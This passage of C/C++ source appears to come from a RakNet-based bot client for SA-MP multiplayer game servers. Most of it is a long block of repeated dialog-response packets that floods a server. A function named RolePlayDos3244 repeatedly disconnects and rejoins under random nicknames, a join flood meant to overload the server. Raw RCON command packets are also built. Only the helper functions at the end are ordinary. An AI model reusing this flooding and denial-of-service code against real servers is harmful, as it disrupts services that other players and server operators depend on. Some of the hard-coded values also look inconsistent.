sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 1, 1, "");
sendDialogResponse(sampDialog.wDialogID, 2, 2, "");
sendDialogResponse(sampDialog.wDialogID, 3, 3, "");
sendDialogResponse(sampDialog.wDialogID, 4, 4, "");
sendDialogResponse(sampDialog.wDialogID, 5, 5, "");
sendDialogResponse(sampDialog.wDialogID, 6, 6, "");
sendDialogResponse(sampDialog.wDialogID, 7, 7, "");
sendDialogResponse(sampDialog.wDialogID, 8, 8, "");
sendDialogResponse(sampDialog.wDialogID, 9, 9, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 11, 11, "");
sendDialogResponse(sampDialog.wDialogID, 12, 12, "");
sendDialogResponse(sampDialog.wDialogID, 13, 13, "");
sendDialogResponse(sampDialog.wDialogID, 14, 14, "");
sendDialogResponse(sampDialog.wDialogID, 15, 15, "");
sendDialogResponse(sampDialog.wDialogID, 16, 16, "");
sendDialogResponse(sampDialog.wDialogID, 17, 17, "");
sendDialogResponse(sampDialog.wDialogID, 18, 18, "");
sendDialogResponse(sampDialog.wDialogID, 19, 19, "");
sendDialogResponse(sampDialog.wDialogID, 20, 20, "");
sendDialogResponse(sampDialog.wDialogID, 21, 21, "");
sendDialogResponse(sampDialog.wDialogID, 22, 22, "");
sendDialogResponse(sampDialog.wDialogID, 23, 23, "");
sendDialogResponse(sampDialog.wDialogID, 24, 24, "");
sendDialogResponse(sampDialog.wDialogID, 25, 25, "");
sendDialogResponse(sampDialog.wDialogID, 26, 26, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 299, 299, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 199, 199, "");
sendDialogResponse(sampDialog.wDialogID, 299, 299, "");
sendDialogResponse(sampDialog.wDialogID, 399, 399, "");
sendDialogResponse(sampDialog.wDialogID, 499, 499, "");
sendDialogResponse(sampDialog.wDialogID, 599, 511, "");
sendDialogResponse(sampDialog.wDialogID, 611, 611, "");
sendDialogResponse(sampDialog.wDialogID, 711, 711, "");
sendDialogResponse(sampDialog.wDialogID, 811, 811, "");
sendDialogResponse(sampDialog.wDialogID, 911, 911, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 111, 111, "");
sendDialogResponse(sampDialog.wDialogID, 121, 121, "");
sendDialogResponse(sampDialog.wDialogID, 131, 131, "");
sendDialogResponse(sampDialog.wDialogID, 141, 141, "");
sendDialogResponse(sampDialog.wDialogID, 151, 11, "");
sendDialogResponse(sampDialog.wDialogID, 161, 161, "");
sendDialogResponse(sampDialog.wDialogID, 171, 171, "");
sendDialogResponse(sampDialog.wDialogID, 181, 11, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
sendDialogResponse(sampDialog.wDialogID, 27, 27, "");
sendDialogResponse(sampDialog.wDialogID, 28, 28, "");
sendDialogResponse(sampDialog.wDialogID, 37, 37, "");
sendDialogResponse(sampDialog.wDialogID, 47, 47, "");
sendDialogResponse(sampDialog.wDialogID, 57, 57, "");
sendDialogResponse(sampDialog.wDialogID, 67, 67, "");
sendDialogResponse(sampDialog.wDialogID, 77, 77, "");
sendDialogResponse(sampDialog.wDialogID, 87, 87, "");
sendDialogResponse(sampDialog.wDialogID, 97, 97, "");
sendDialogResponse(sampDialog.wDialogID, 0, 0, "");
sendDialogResponse(sampDialog.wDialogID, 117, 117, "");
sendDialogResponse(sampDialog.wDialogID, 127, 127, "");
sendDialogResponse(sampDialog.wDialogID, 137, 137, "");
sendDialogResponse(sampDialog.wDialogID, 147, 147, "");
sendDialogResponse(sampDialog.wDialogID, 157, 157, "");
sendDialogResponse(sampDialog.wDialogID, 167, 167, "");
sendDialogResponse(sampDialog.wDialogID, 177, 177, "");
sendDialogResponse(sampDialog.wDialogID, 187, 187, "");
sendDialogResponse(sampDialog.wDialogID, 191, 191, "");
sendDialogResponse(sampDialog.wDialogID, 201, 201, "");
sendDialogResponse(sampDialog.wDialogID, 211, 211, "");
sendDialogResponse(sampDialog.wDialogID, 221, 221, "");
sendDialogResponse(sampDialog.wDialogID, 231, 231, "");
sendDialogResponse(sampDialog.wDialogID, 241, 241, "");
sendDialogResponse(sampDialog.wDialogID, 251, 251, "");
sendDialogResponse(sampDialog.wDialogID, 261, 261, "");
}

void RolePlayDos3244() 
{
  DWORD spamTimeDisconnect = GetTickCount();
        DWORD spamTimeSpam = GetTickCount();
	 pRakClient = RakNetworkFactory::GetRakClientInterface();
	if (iGameInited && GetTickCount() - spamTimeSpam >= settings.ispamtime) {
		spamTimeSpam = GetTickCount();
	}

	if (GetTickCount() - spamTimeDisconnect >= settings.ispamrejointime) {
		gen_random(g_szNickName, rand()%16+3);
		iGettingNewName = true;
		sampDisconnect(0);
		resetPools(1, 1);
		spamTimeDisconnect = GetTickCount();
	}
}

void sendServerCommand(char *szCommand)
{
	if (!strnicmp(szCommand+1, "rcon", 4))
	{
		RakNet::BitStream bsSend;
		bsSend.Write((BYTE)ID_RCON_COMMAND);
		DWORD len = strlen(szCommand+4);
		if (len > 0) {	
			bsSend.Write(len);
			bsSend.Write(szCommand+6, len);
		} else {
			bsSend.Write(len);
			bsSend.Write(szCommand+5, len);
		}
		pRakClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	}
	else
	{
		RakNet::BitStream bsParams;
		int iStrlen = strlen(szCommand);
		bsParams.Write(iStrlen);
		bsParams.Write(szCommand, iStrlen);
		pRakClient->RPC(&RPC_ServerCommand, &bsParams, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
}

void sendChat(char *szMessage)
{
	RakNet::BitStream bsSend;
	BYTE byteTextLen = strlen(szMessage);
	bsSend.Write(byteTextLen);
	bsSend.Write(szMessage, byteTextLen);
	pRakClient->RPC(&RPC_Chat, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void sendChat2(char *szMessage)
{
	RakNet::BitStream bsSend;
	BYTE byteTextLen = strlen(szMessage);
	bsSend.Write(byteTextLen);
	bsSend.Write(szMessage, byteTextLen);
	pRakClient->RPC(&RPC_ClientMessage, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void SendScmEvent(int iEventType, DWORD dwParam1, DWORD dwParam2, DWORD dwParam3)
{
	RakNet::BitStream bsSend;
	bsSend.Write(iEventType);
	bsSend.Write(dwParam1);
	bsSend.Write(dwParam2);
	bsSend.Write(dwParam3);
	pRakClient->RPC(&RPC_ScmEvent, &bsSend, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}

void sendDialogResponse(WORD wDialogID, BYTE bButtonID, WORD wListBoxItem, char *szInputResp)
{
	BYTE respLen = (BYTE)strlen(szInputResp);
	RakNet::BitStream bsSend;
	bsSend.Write(wDialogID);
	bsSend.Write(bButtonID);
	bsSend.Write(wListBoxItem);
	bsSend.Write(respLen);
	bsSend.Write(szInputResp, respLen);
	pRakClient->RPC(&RPC_DialogResponse, &bsSend, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}




int isPlayerConnected(PLAYERID iPlayerID)
{
	if(playerInfo[iPlayerID].iIsConnected && iPlayerID >= 0 && iPlayerID <= MAX_PLAYERS)
		return 1;

	return 0;
}

int getPlayerID(char *szPlayerName)
{
	int i;
	for(i = 0; i < MAX_PLAYERS; i++)
	{
		if(playerInfo[i].iIsConnected == 0) continue;

		if(!strcmp(playerInfo[i].szPlayerName, szPlayerName))
			return i;
	}

	return -1;
}

char *getPlayerName(PLAYERID iPlayerID)
{
	if(playerInfo[iPlayerID].iIsConnected && iPlayerID >= 0 && iPlayerID <= MAX_PLAYERS)
		return playerInfo[iPlayerID].szPlayerName;

	return 0;
}

int getPlayerPos(PLAYERID iPlayerID, float *fPos)
{
	if(!playerInfo[iPlayerID].iIsConnected) return 0;

	if(iPlayerID > 0 && iPlayerID <= MAX_PLAYERS)
	{
		memcpy(fPos, playerInfo[iPlayerID].onfootData.vecPos, sizeof(float) * 3);
		return 1;
	}

	return 0;
}

PLAYERID getPlayerIDFromPlayerName(char *szName)
{
	for(int i = 0; i < MAX_PLAYERS; i++)
	{
		if(!playerInfo[i].iIsConnected) continue;
		if(!strcmp(playerInfo[i].szPlayerName, szName))
			return (PLAYERID)i;
	}

	return -1;
}

unsigned short getPlayerCount()
{
	unsigned short count = 0;
	for(int i = 0; i < MAX_PLAYERS; i++)
	{
		if(!playerInfo[i].iIsConnected) continue;
		count++;
	}
	return count;
}

const struct vehicle_entry *gta_vehicle_get_by_id ( int id )
{
	id -= VEHICLE_LIST_ID_START;

	if ( id < 0 || id >= VEHICLE_LIST_SIZE )
		return NULL;

	return &vehicle_list[id];
}
